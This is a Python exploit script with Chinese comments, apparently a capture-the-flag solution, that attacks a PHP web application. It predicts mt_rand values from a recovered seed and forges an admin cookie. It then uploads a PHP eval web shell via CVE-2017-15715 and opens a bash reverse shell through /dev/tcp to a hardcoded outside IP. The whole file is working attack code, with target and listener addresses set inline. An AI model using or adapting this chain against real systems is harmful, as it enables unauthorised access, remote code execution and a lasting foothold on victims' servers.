from base64 import b64encode
from os import remove
from subprocess import check_output
from threading import Thread
from time import sleep

import requests

from reverse_mt_rand import main as reverse


def reverse_shell(ip, port):
    print(f"try to reverse {ip}:{port}")
    try:
        requests.post(webshellurl, data={
                        "a": f"""system("bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'");"""})
    except Exception:
        return


# 修改这里
ip = "120.27.146.26"  # 反弹ip
port = "23334"  # 反弹端口
url = "http://173.82.206.142:8001/front/index.php"
webshellname = "test.php"


#
adminurl = "/".join(url.split("/")[:-2]) + "/admin/index.php"
uploadurl = "/".join(url.split("/")[:-2]) + "/admin/upload.php"
webshellurl = "/".join(url.split("/")[:-2]) + \
    "/upload/" + webshellname + chr(10)

s = requests.Session()

# 获取cookie
s.get(url)
# 获取随机数文件
res = s.post(url, data={"get_code": True, "length": 228})
result = res.json()['content']
numbers = result.split(" ")
# 读取1和228个随机数
a, b = int(numbers[0]), int(numbers[-1])
# 计算seed
seed = reverse(a, b, 0, 0)
print("seed is %d" % seed)
# 获得第301个随机数
code = "<?php mt_srand(%d);for($i=0;$i<300;$i++){$b=mt_rand();}echo mt_rand();" % seed
with open("test.php", "w+") as f:
    f.write(code)
result = int(check_output('php test.php').decode())
remove("test.php")
print("301 number is %d" % result)

# 发送正确答案
res = s.post(url, data={"rand": result})
res.encoding = res.apparent_encoding
print(res.text)
if ("failed" in res.text):
    print("答案错误请重试")
    exit(1)
# 请求后台
cookies = s.cookies.get_dict()
print("cookies:\n", cookies)
# 越权
cookies['Username'] = b64encode("x1hy9".encode()).decode()

# CVE-2017-15715
with open(webshellname, "w+") as f:
    f.write("<?php eval($_POST['a']); ?>")

res = requests.post(uploadurl, data={
                    "name": webshellname + chr(10)}, cookies=cookies, files={"file": ("test.php", open(webshellname, "r"))})
print(res, "\n", res.text)

# 反弹shell
t = Thread(target=reverse_shell, args=(ip, port))
t.setDaemon(True)
t.start()
# 善后
remove("test.php")
print("Ctrl+c to leave")
try:
    while True:
        sleep(60)
except (KeyboardInterrupt, EOFError):
    pass
print("Bye")
